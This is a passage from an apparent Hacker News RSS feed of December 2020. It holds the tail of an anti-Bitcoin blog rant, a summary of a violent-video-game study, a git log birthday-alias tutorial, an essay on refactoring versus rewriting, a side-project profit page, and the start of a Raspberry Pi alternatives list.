    <p>From then on toxic bitcoin maximalists (and crypto currency nuts) appeared everywhere. Remember that “fishy smell” from before? It turned into dogshit. What bitcoin stood for had transitioned the way I had. It wasn't about changing the world anymore, but about increasing one's own wallet. My disregard culminated at the sight of the following series of events:</p>

    <p>“Just BTFD #bitcoin” —Adam Back</p>

    <p>“Btw it was what I did this morning "Just BTFD #bitcoin
      " ie "Just Bought TFD". I had seen DMs about buying on waking up and looking at price, then saw news @coinbase
      crashed (yet again), and bought some at $8600.” —Adam Back; <a href="https://twitter.com/adam3us/status/1259386895806726144">source</a></p>

    <p>If a CEO that feels the need to encourage people into buying a product he has vested interests in isn't a red flag, then I don't know what is; products should speak for themselves. The possibility of him being Satoshi Nakamoto didn't help either:</p>

    <iframe src="https://www.youtube-nocookie.com/embed/XfcvX0P1b5g" frameborder="0" allow=" autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    <p><sub>—YouTube: “Bitcoin - Unmasking Satoshi Nakamoto” by Barely Sociable</sub></p><p>But wait, it doesn't end there. Here's Luke Dashjr, a Bitcoin Core developer who helps build the software running on thousands of computers.</p>

    <p>“Masturbation is a very grave sin, arguably even worse than murder.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1223706601871302658">source</a>.</p>

    <p>“I don't have a dog, but I would totally try one and eat it if it tastes decent. Had a cat once. Planned to eat it, but something else got to it first. Currently have a pair of male &amp; female bunny. Plan to eat some of the babies, but… we're failing to get them to breed.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1169615995742380035">source</a>.</p>

    <p>“You have it backwards. Guns protect life. And no, animals have no rights. They also exist specifically for human consumption.” —Luke Dashjr; <a href="https://twitter.com/LukeDashjr/status/1169669024369795072">source</a>.</p>

    <p>Completely nuts. Sure, someone's religion doesn't necessarily prevent them building decent things. But if one is capable of such fallacious reasoning and fully supporting barbaric practices, then they're capable of implementing some iffy stuff in whatever they do. Here he justifies slavery and geocentrism: <a href="https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes/">https://www.reddit.com/r/Buttcoin/comments/4936kw/lukejr_is_a_seriously_a_super_crazy_person_quotes</a>.</p>

    <p>To consider I once thought the crypto scene was a bit crazy because of this ridiculous performance during an Ethereum convention (another crypto currency); boy, did I have another thing coming…</p>

    <iframe src="https://www.youtube-nocookie.com/embed/j7MeJionPMA" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    <p><sub>—YouTube: “EDCON 2019 - Vitalik and Ethereum Foundation dance and rap”</sub></p><p>I want to stop writing about this soulless topic so bad, but I'm not done yet. People need to know what they're getting into. A purely speculative uninspirational asset, that's what.</p>

    <p>Speculation has become bitcoin's main purpose, but without the capability for large-scale transactions <sup>(6)</sup>. Unlike our day-to-day currencies, which are used for both. Earning money by trading money is a worthless “skill”. Doing so produces nothing of real value to society and the same goes for day trading stocks. This is aptly communicated by Matthew McConaughey in The Wolf of Wallstreet:</p>

    <p>“Number one rule of Wallstreet. […] Nobody knows if a stock is gonna go up, down, sideways or in fucking circles. Least of all, stockbrokers, right? It's all a fugazi. […] It's fairy dust. It doesn't exist. It's …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.quitfacebook.org/file/greed.html">https://www.quitfacebook.org/file/greed.html</a></em></p>]]>
            </description>
            <link>https://www.quitfacebook.org/file/greed.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570070</guid>
            <pubDate>Tue, 29 Dec 2020 14:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ten year study: No link between violent video games and aggressive behavior]]>
            </title>
            <description>
<![CDATA[
Score 970 | Comments 513 (<a href="https://news.ycombinator.com/item?id=25570038">thread link</a>) | @chops
<br/>
December 29, 2020 | https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life | <a href="https://web.archive.org/web/*/https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <div><p>A <span><a title="Longitudinal Study into Violent Video Games" href="https://www.liebertpub.com/doi/abs/10.1089/cyber.2020.0049">ten-year longitudinal study</a></span>&nbsp;published in the Journal of <em>Cyberpsychology, Behavior, and Social Networking</em> on a group in early adolescence from as young as ten years old, investigated how playing violent video games at an early age would translate into adulthood behavior (23 years of age). Titled "Growing Up with Grand Theft Auto: A 10-Year Study of Longitudinal Growth of Violent Video Game Play in Adolescents" the study found no correlation between growing up playing video games and increased levels of aggression ten years later.</p><p>This particular study utilized a more contemporary approach for analyzing its data, known as the person-centered approach. Traditional studies use a variable-centered approach whereby researchers treat each variable, or characteristic, as related to another variable. An example would be that exercising is related to a reduced incidence of heart disease. This has been particularly valuable when comparing groups. In a person-centered approach researchers combine various algorithms across variables to determine how these variables compare among individuals. This approach provides a more accurate depiction of how variables relate to the individual.</p><p>As such, this study “accounts for heterogeneity, grouping individuals who are similar and who share a set of characteristics that vary similarly over time.” Participant families were recruited through “a large north-western city” beginning in 2007 (Wave 1) via telephone directories and required to complete questionnaires. 65% were Caucasian, 12% black and 19% multi-ethnic, 4% other. Families of lower socioeconomic status were underrepresented as part of the initial sample group and therefore needed recruitment via referrals and fliers to add to and diversify the sample group.</p><p>Video game violence ratings were assessed through the Common Sense Media, known to be a viable rating body for media. Participants were assessed through various behavioral characteristics such as aggression, depressive symptoms, anxiety symptoms, and prosocial behavior.</p><p>Results showed that boys played more violent video games than girls. Groups displayed three forms of video game play, according to the study: high-initial violence (4%) which indicated individuals played a high-level of violent video games at an early age, moderate initial violence (23%) whereby violent video game play was moderate at an early age, and low initial violence (73%).</p><p>The study concluded that group with low initial violence “was no higher in aggressive behavior than the high initial violence group at the final time point.” Therefore, it is determined that adolescents who played a high-level of violent video games at an early age did not show more aggressive behavior later in life than those who played fewer to no hours of violent video games at an early age.</p></div>
    </div></div>]]>
            </description>
            <link>https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570038</guid>
            <pubDate>Tue, 29 Dec 2020 14:31:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Git cake: when is my readme’s birthday?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25569935">thread link</a>) | @bhupesh
<br/>
December 29, 2020 | https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/ | <a href="https://web.archive.org/web/*/https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <p><img alt="git cake: when is my README's birthday?" src="https://raw.githubusercontent.com/Bhupesh-V/Bhupesh-V.github.io/master/images/git-cake-day-demo.png"></p><p>Do you want to know when was a file/directory committed in your git repo?
Well here is <code>git log</code> at your rescue!</p>

<div><div><pre><code>
git log <span>--date</span><span>=</span>format:<span>'%d %b %Y'</span> <span>--diff-filter</span><span>=</span>A <span>--name-only</span> <span>--pretty</span><span>=</span><span>'%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)'</span>

</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/34342551/103223519-6b366080-494c-11eb-9d54-acebd0179ffb.png" alt="git-cake-demo-paager"></p>

<p>Ok ok! Let me explain for you lazy asses</p>

<ul>
  <li>
    <p><code>--date=format:'%d %b %Y'</code></p>

    <p>This is pretty much self explanatory, suit this to your own preferred date format. <a href="https://git-scm.com/docs/git-log#Documentation/git-log.txt---dateltformatgt">Other date formats</a></p>
  </li>
  <li>
    <p><code>--diff-filter=A --name-only</code></p>

    <p>This lets you filter nodes that were Added(A). Other filters include: Copied(C), Deleted(D), Modified(M) or Renamed(R).
Multiple filters can be used together e.g <code>--diff-filter=AC</code>.</p>

    <p>The <code>--name-only</code> shows only names of changed files. If you had like to print some status as well use <code>--name-status</code></p>
  </li>
  <li>
    <p><code>--pretty='%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)</code></p>

    <p>This is the beauty that is responsible for printing <code>🎂️ 18 Jun 2019 by (f72312c)</code>.</p>

    <p>Git provides us with various format specifiers these include.</p>
    <ul>
      <li>%n  : newline</li>
      <li>%h  : abbreviated commit hash (short version, use %H for complete hash)</li>
      <li>%ad : author date that respects the previously specified –date= option</li>
    </ul>
  </li>
</ul>

<p><a href="https://git-scm.com/docs/git-log#_pretty_formats"><strong>Read git pretty docs</strong></a> for info. on all 50+ options</p>

<blockquote>
  <p>Read more than 2000 lines worth of git log manual (<code>git log --help</code>) when you feel absolutely free :)</p>
</blockquote>

<p>You should add this in your <code>.gitconfig</code>.</p>

<div><div><pre><code>[user]
	email = varshneybhupesh@gmail.com
	name = Bhupesh-V
[commit]
	template = /home/bhupesh/.gitmessage
[core]
	editor = nano
[credential]
	helper = store
[alias]
        cake = log --date=format:'%d %b %Y' --diff-filter=A --name-only --pretty='%n%C(yellow bold)🎂️ %ad%Creset by (%C(blue bold)%h%Creset)'
</code></pre></div></div>

<p>Now send me some presents, will ya?
Please?</p>

  </div></div>]]>
            </description>
            <link>https://bhupesh-v.github.io/git-cake-when-is-my-readme-birthday/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569935</guid>
            <pubDate>Tue, 29 Dec 2020 14:21:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why refactoring code is almost always better than rewriting it (2012)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569916">thread link</a>) | @ferbass
<br/>
December 29, 2020 | https://www.ben-morris.com/why-refactoring-code-is-almost-always-better-than-rewriting-it/ | <a href="https://web.archive.org/web/*/https://www.ben-morris.com/why-refactoring-code-is-almost-always-better-than-rewriting-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_container">
            <div id="content">

		<article>

		<p id="article_date">30 April 2012</p>

		

		<p><a href="http://www.bonkersworld.net/building-software/" rel="nofollow" target="_blank"><img alt="The life of a software engineer..." height="342" src="https://www.ben-morris.com/images/refactoring-vs-rewriting.gif" title="The life of a software engineer... as found on bonkersworld.net" width="450"></a>Developers and architects like to build things, so their initial impulse is often to flatten the place, lay some stronger foundations and build something impressive. It can be difficult to get them excited about incremental innovation, even when this is generally the most sensible approach from both a technical and commercial perspective.</p>
<p><a href="http://www.joelonsoftware.com/articles/fog0000000069.html" rel="nofollow" target="_blank">Joel Spolsky</a> wrote a post back in 2000 about Netscape's decision to rewrite their browser from scratch in the late 1990s. It's as relevant today as it was more than ten years ago. He described the rewrite as "<em>the single worst strategic mistake that any software company can make</em>" and I am inclined to agree. It took several years during which Netscape watched helplessly as their market share plummeted. Would iterative releases of a troubled code base really have been so bad an alternative?</p>
<h2>Developers can't help it - they just want to write new code</h2>
<p>Netscape provides an extreme example but technical teams often lobby to rewrite "legacy" code. The argument in favour of a rewrite is pretty obvious to them. The code is riddled with <a href="http://martinfowler.com/bliki/TechnicalDebt.html" rel="nofollow" target="_blank">technical debt</a>&nbsp;accumulated through years of compromises and quick fixes. It's slowing them down and restricting their ability to deliver enhancements. This may be true to a degree, but it's often the developer's natural reluctance to work with code written by somebody else that lies at the heart of this argument.</p>
<p>Peter Hallam suggested that&nbsp;<a href="http://blogs.msdn.com/b/peterhal/archive/2006/01/04/509302.aspx" rel="nofollow" target="_blank">developers spend more time&nbsp;<em>understanding</em>&nbsp;code</a>&nbsp;then they do actually writing it. If you are modifying code then you have to take the time to figure out what it does before you can adjust it. Understanding code written by somebody else requires considerable patience and it can be very tempting to dive in and start writing your own version instead.</p>
<p>Developers tend to be dismissive of code written by somebody else. This is often unfair as any difficulties may caused unfamiliaty rather than the original author's poor technique. Everybody has their own coding style, their favourite tricks and their own way of doing things. No coding standards will overcome the fact that another developer's code is always going to seem strange. Better developers will generally have the discipline to understand <em>why</em> code has been written a certain way before dismissing it.</p>
<h2>Nobody sets out to write bad code</h2>
<p>Any developer who is working on a long-established code base will tell you what a <em>mess</em> it is. There will be horror stories of methods several hundred lines long and classes of byzantine complexity. If only they were given the chance to rewrite it they would produce a clean, focused architecture that would be good for many years to come.</p>
<p>The problem is that nobody ever means to write bad code. <em>Bad code happens to good developers</em>.&nbsp;Requirements change, deadlines requires "quick and dirty" solutions that are never remedied, requirements turn out to be more complex than you originally thought. Software development does not happen in isolation and it has to interact with an uncertain environment dominated by unstable budgets and behaviour.</p>
<p>Technical debt is a fact of life on every software development project and it is not going to be completely cleared by a rewrite. You are just as likely to exchange one set of issues for another.&nbsp;You can try to protect yourself with flexible software design, create loosely coupled components and define clear responsibilities. Whatever you do, another set of developers will still come along in a few years and dismiss your code a muddle.</p>
<h2>How do you measure technical debt?</h2>
<p>It may seem obvious to developers&nbsp;that it's time to pay down the technical debt&nbsp;that has built up through years of quick fixes, but&nbsp;it's generally less clear to commercial stakeholders. Code rewrite projects are difficult to sell because you aren't necessarily delivering anything <em>new</em>. The stakeholders have already paid to have this stuff written and feel that they are being asked to pay again just to have it written <em>properly</em>.</p>
<p>It is difficult to quantify technical debt in any meaningful way because it is generally justified in terms of its effect on productivity. This is notoriously tricky to measure in any meaningful way due to difficulties in identifying reliable metrics for typical development activities such as implementing new features and fixing bugs.</p>
<p>Given how hard it is to build a meaningful business case for a code rewrite it is often easier to focus on improving smaller, more specific functional areas. If it works out then you will find it easier to justify further investment in improvement.&nbsp;An iterative approach based on refactoring is always easier to sell than a big bang with vaguely defined returns.</p>
<p>There does come a point at which technical debt becomes overwhelming, of course. Old code can be left for so long that it can fall too far behind prevailing industry technologies. This can create compatibility problems and form a genuine barrier to new feature development. Attracting and retaining a development team can become difficult and expensive if your code is based on legacy technology. This is the point at which iterative refactoring can start to seem like an anaemic response.</p>
<h2>That messy code is more valuable than it looks</h2>
<p>Bear in mind that the large slab of nasty source code that few people really understand often represents many years of investment and effort. It's a major chunk of intellectual property that underpins revenue generation and you should think carefully before throwing it away.</p>
<p>Established code contains a lot of encapsulated knowledge earned through years of testing and real world use. Old code may be cantankerous and difficult to understand, but it usually&nbsp;<em>works</em>. There is no reason why your replacement system will be more reliable than the original, in fact, it will probably be worse as you find mistakes to make and create a new set of bugs to find and fix.</p>

		

		<p>Filed under 
			
			<a href="https://www.ben-morris.com/category/architecture">Architecture</a>
			, <a href="https://www.ben-morris.com/category/development-process">Development process</a>
			, <a href="https://www.ben-morris.com/category/favourite-posts">Favourite posts</a>.
		</p>

		</article>


            </div>
        </div></div>]]>
            </description>
            <link>https://www.ben-morris.com/why-refactoring-code-is-almost-always-better-than-rewriting-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569916</guid>
            <pubDate>Tue, 29 Dec 2020 14:19:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Four years of profitable side-projects]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 25 (<a href="https://news.ycombinator.com/item?id=25569562">thread link</a>) | @czue
<br/>
December 29, 2020 | https://www.coryzue.com/open/ | <a href="https://web.archive.org/web/*/https://www.coryzue.com/open/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
    
    
    <div>
      <div>
        <p>$<span id="total-profits">-</span></p>
        <p>Total Profit</p>
      </div>
      <div>
        <p><span id="total-hours">-</span></p>
        <p>Total Hours</p>
      </div>
      <div>
        <p>$<span id="total-rate">-</span><span>/hour</span></p>
        <p>Effective Rate</p>
      </div>
    </div>
    <div>
      <div>
        <p>Profits by Year</p>
        <canvas id="yearly-profits"></canvas>
      </div>
      <div>
        <p>Effort by Year</p>
        <canvas id="yearly-hours"></canvas>
      </div>
    </div>
    <div>
      <div id="placecard-data">
        <h2>❤️ <a href="https://www.placecard.me/" target="_blank">Place
          Card Me</a></h2>
        <h3>The best way to make place cards online.</h3>
        <h3>🚀 May 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr </h3>
        
        
        
      </div>
      <div id="pegasus-data">
        <h2>🦄 <a href="https://www.saaspegasus.com/" target="_blank">SaaS
          Pegasus</a></h2>
        <h3>A Django-Powered SaaS Template for your next big
          idea.</h3>
        <h3>🚀 June 2019 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
      <div id="chatstats-data">
        <h2>💬 <a href="https://chatstats.co/" target="_blank">Chat
          Stats</a></h2>
        <h3>Analytics and leaderboards for your GroupMe groups.</h3>
        <h3>🚀 Dec 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
    </div>
    
  </div>
</section></div>]]>
            </description>
            <link>https://www.coryzue.com/open/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569562</guid>
            <pubDate>Tue, 29 Dec 2020 13:30:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi Alternatives in 2021: Hackboard, Zimaboard, RockPi, Odroid and More]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25569407">thread link</a>) | @jamesmd
<br/>
December 29, 2020 | https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3167">

	

	<div>
		
<p>Need a SBC for a project? Checkout my recommendations for Raspberry Pi Alternatives in 2021 below.</p>



<figure><table><tbody><tr><td><img src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>HackBoard 2<br><em>A very small but powerful x86 SBC</em></td><td><a href="https://www.crowdsupply.com/hackboard/hb2" target="_blank" rel="noreferrer noopener">Buy Now at Crowd Supply!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Hackboard_2">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ZimaBoard<br><em>Small but Mighty, dual NIC x86 SBC Designed specifically to be used as a home server.</em></td><td><a href="https://www.zimaboard.com/">More at Zimaboard</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ZimaBoard">More Info</a></td></tr><tr><td><img src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/gzhls.at/i/89/91/1968991-m3.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Rock Pi4<br><em>A powerful Hex Core ARM based SBC sharing the same physical form factor as a Raspberry Pi Model B</em></td><td><a href="https://www.amazon.co.uk/gp/product/B07XD8HZBY/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B07XD8HZBY&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=1026f70c5b125cfadf15c563c959d9bf" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#RockPi_4_Model_B">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.odroid.co.uk/image/cache/catalog/Products/ODROID%20H2/H2%20Top-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ODROID-H2+<br><em>Powerful Quad Core x86 SBC With Dual NICs.</em></td><td><a href="https://www.odroid.co.uk/ODroid-H2">Buy Now at ODROID!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ODROIDH2+">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>NanoPi R4S<br><em>A tin</em>y Hex Core ARM SBC With Dual NICs and up to 4GB RAM.</td><td><a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=284">Buy Now at Friendly Arm!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NanoPi_R4S">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>ZeroPi<br><em>A ultra budget Quad Core ARM SBC with a Gigabit NIC at a very low price.</em></td><td><a href="https://www.friendlyarm.com/index.php?route=product/product&amp;path=69&amp;product_id=266&amp;sort=p.price&amp;order=ASC">Buy Now at Friendly Arm!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#ZeroPi">More Info</a></td></tr><tr><td><img src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" alt="Jetson Nano Developer Kit" data-recalc-dims="1" data-old-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td><em>NVIDIA Jetson Nano<br>A powerful Arm SBC featuring an onboard NVIDIA GPU.</em></td><td><a href="https://www.amazon.co.uk/gp/product/B08J157LHH/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B08J157LHH&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=5fccf89294b3c2fbd9e717042f2bd603" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano">More Info</a></td></tr><tr><td><img src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;ssl=1" data-recalc-dims="1" data-old-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;ssl=1" data-lazy-src="https://i2.wp.com/sm.pcmag.com/t/pcmag_uk/news/a/asus-annou/asus-announces-tinker-board-2-and-2s-single-board-computers_eemu.1920.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Asus Tinker Board &nbsp;<br>A powerful Well supported Quad Core SBC</td><td><a href="https://www.amazon.co.uk/gp/product/B06VSBVQWS/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B06VSBVQWS&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=acaac47fe896ec85341ec08c83f900a2" target="_blank" rel="noreferrer noopener sponsored nofollow">Buy Now at Amazon!</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Asus_Tinker_Board">More Info</a></td></tr><tr><td><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://pbs.twimg.com/media/EmIHW1PU0AACi0A?format=jpg&amp;name=900x900" alt="Image" data-old-src="https://pbs.twimg.com/media/EmIHW1PU0AACi0A?format=jpg&amp;name=900x900" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></td><td>Sipeed XuanTie C906 <br>A yet to be released $12 RISC-V SBC</td><td><a href="https://twitter.com/SipeedIO/status/1324632751157374977">More Info on Twitter</a></td><td><a href="https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#Sipeed_XuanTie_C906">More Info</a></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table></figure>




<h2><span id="Hackboard_2"></span>Hackboard 2<span></span></h2>



